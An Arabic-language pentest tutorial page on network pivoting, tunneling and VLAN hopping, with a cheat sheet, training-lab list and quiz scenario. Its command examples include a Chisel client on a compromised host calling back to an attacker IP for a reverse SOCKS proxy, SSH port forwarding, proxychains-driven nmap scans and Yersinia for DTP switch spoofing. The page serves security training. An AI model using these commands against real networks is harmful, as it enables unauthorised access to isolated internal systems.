اختراق الشبكات والتمحور (Network Pentesting & Pivoting)

فهم عميق لتقنيات اختراق الشبكات، التوجيه (Routing)، القفز بين الشبكات الوهمية (VLAN Hopping)، وإنشاء قنوات الاتصال (Pivoting).

الجانب النظري (Theory)

يُعد اختبار اختراق الشبكات (Network Pentesting) من الركائز الأساسية في تقييم الأمن السيبراني للبنية التحتية. يركز هذا المجال على استكشاف واستغلال الثغرات في الأجهزة الشبكية، بروتوكولات التوجيه (Routing Protocols)، وهيكلية الشبكات المعزولة.

من أهم المفاهيم المتقدمة في هذا السياق:
- التمحور (Pivoting): استخدام نظام مخترق (Compromised Host) كنقطة انطلاق (Gateway) للوصول إلى شبكات داخلية معزولة غير مرئية من الخارج.
- VLAN Hopping: تقنية تمكن المهاجم من تجاوز العزل المفروض بواسطة (Virtual LANs) للوصول إلى حركة مرور أو أجهزة في شبكات VLAN أخرى.
- Port Forwarding & Tunneling: إعادة توجيه المنافذ وتغليف البيانات (Encapsulation) داخل بروتوكولات آمنة مثل SSH لتجاوز الجدران النارية.

الفحص اليدوي (Manual Testing)

لإجراء اختبار اختراق للشبكات والتمحور يدوياً، يجب تتبع الخطوات التالية بدقة:

  • اكتشاف الشبكات الداخلية: بعد اختراق جهاز أولي، قم بالتحقق من واجهات الشبكة المتاحة باستخدام أوامر مثل ip a أو ifconfig، وافحص جدول التوجيه route -n أو arp -a.
  • إعداد Port Forwarding: إذا كان المنفذ الداخلي غير متاح من الخارج، يمكنك استخدام SSH Port Forwarding للوصول إليه يدوياً. (مثال: Local Port Forwarding).
  • تنفيذ VLAN Hopping: يدوياً عبر إعداد واجهة شبكية وهمية (Virtual Interface) تدعم 802.1Q، وتجربة إرسال حزم DTP (Dynamic Trunking Protocol) لتفعيل وضع الـ Trunk إذا كان السويتش غير معد بشكل آمن (Switch Spoofing).
  • استخدام Chisel: إعداد Chisel كـ Server على جهاز المهاجم، و Client على الجهاز المخترق لإنشاء Reverse Socks Proxy.

الأتمتة (Automation)

يمكن أتمتة اكتشاف الشبكات الداخلية وعمليات التمحور باستخدام نصوص برمجية وأدوات متقدمة:

  • استخدام نصوص Bash/PowerShell Ping Sweeps لاكتشاف الأجهزة الحية داخل الشبكة المخترقة دون نقل أدوات خارجية كـ Nmap.
  • توظيف أداة Ligolo-ng أو Sliver C2 التي تدعم ميزات التمحور والتوجيه الداخلي بشكل تلقائي وفعال.
  • أتمتة الفحص في شبكات داخلية باستخدام Proxychains لدمج أدوات الفحص المعتادة (مثل Nmap و CrackMapExec) مع الـ Socks Proxy.

الأدوات والأوامر (Tools & Commands)

1. Chisel (Socks5 Proxy)

attacker@kali:~# chisel server -p 8000 --reverse
victim@target:~$ ./chisel client <Attacker-IP>:8000 R:socks

2. SSH Port Forwarding (Local)

attacker@kali:~# ssh -L 8080:10.0.0.5:80 user@192.168.1.100

3. Proxychains Setup

attacker@kali:~# nano /etc/proxychains4.conf
# Add: socks5 127.0.0.1 1080
proxychains nmap -sT -Pn -p 445 10.0.0.0/24

4. VLAN Hopping (Yersinia)

attacker@kali:~# yersinia -G

بيئات التدريب (Labs)

  • HackTheBox: مسارات الشبكات والتمحور مثل (Pro Labs: Dante, Offshore).
  • TryHackMe: غرف مثل (Wreath, Network Services, Pivoting).
  • GNS3 / EVE-NG: بناء بيئة محلية لاختبار بروتوكولات التوجيه وهجمات VLAN Hopping و DTP.

اختبار المعرفة (Quiz)

Scenario: لقد حصلت على اختراق لجهاز خادم موجه للإنترنت (Web Server) وترغب في استكشاف شبكة الإدارة الداخلية (10.10.10.0/24) التي لا يمكن الوصول إليها مباشرة. أي من التقنيات التالية ستقوم باستخدامها؟

ورقة المراجع (Cheat Sheet)

التقنية (Technique) الوصف (Description) الأداة / الأمر (Command/Tool)
Local Port Forwarding ربط منفذ محلي بمنفذ على خادم داخلي عبر SSH. ssh -L local_port:target_ip:target_port user@pivot_ip
Dynamic Port Forwarding إنشاء SOCKS Proxy لتوجيه حركة المرور المتعددة عبر نفق SSH. ssh -D 1080 user@pivot_ip
Chisel (Reverse Proxy) إنشاء SOCKS proxy من جهاز الضحية إلى جهاز المهاجم، ممتاز لتجاوز الجدران النارية. Server: chisel server -p 8000 --reverse
Client: chisel client IP:8000 R:socks
VLAN Hopping (DTP) التلاعب ببروتوكول DTP لتحويل واجهة الشبكة إلى Trunk للوصول لعدة شبكات VLANs. أدوات: Yersinia, Scapy
Proxychains توجيه أدوات الفحص (مثل Nmap) عبر الـ SOCKS Proxy المُنشأ. proxychains nmap -sT -Pn <Target>
